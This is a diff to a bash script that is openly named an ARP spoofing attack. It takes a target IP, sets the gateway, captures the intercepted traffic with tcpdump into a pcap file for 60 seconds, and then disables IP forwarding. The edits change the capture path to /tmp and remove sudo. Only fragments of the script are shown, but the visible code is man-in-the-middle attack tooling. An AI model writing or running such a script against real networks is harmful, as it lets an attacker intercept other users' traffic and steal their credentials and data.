@@ -4,7 +4,7 @@
 TARGET_IP=$1
 LOG_FILE="/home/rb/arp_attack_logs.txt"
 GATEWAY_IP="172.30.112.1"  # Adjust to your network
-CAPTURE_FILE="/home/rb/arp_capture.pcap"# Path to capture file
+
 
 # Function to log messages
 log_message() {
@@ -34,7 +34,7 @@ SPOOF_PID=$!
 
 # Start TCP dump to capture traffic
 log_message "Starting traffic capture"
-sudo tcpdump -i eth0 -w $CAPTURE_FILE &
+tcpdump -i eth0 -w /tmp/arp_capture.pcap &
 TCPDUMP_PID=$!
 
 # Run for 60 seconds
@@ -49,4 +49,4 @@ echo 0 > /proc/sys/net/ipv4/ip_forward
 log_message "Disabled IP forwarding"
 
 # Log the completion and capture file location
-log_message "ARP spoofing attack completed. Captured traffic saved to $CAPTURE_FILE"
+log_message "ARP spoofing attack completed. Captured traffic saved to /tmp/arp_capture.pcap"
